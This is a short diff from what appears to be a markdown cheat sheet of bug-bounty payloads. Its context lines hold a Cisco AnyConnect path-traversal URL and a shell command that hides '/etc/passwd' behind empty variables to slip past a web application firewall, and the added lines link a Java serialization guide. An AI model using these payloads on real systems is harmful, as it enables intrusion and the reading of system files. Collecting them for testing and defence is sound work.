@@ -19,3 +19,8 @@ https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&r
 ```
 cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
 ```
+### JAVA Serialization Vulnerability
+
+```
+https://medium.com/bugbountywriteup/a-comprehensive-guide-to-java-serialization-vulnerability-18fad6e37b64
+```
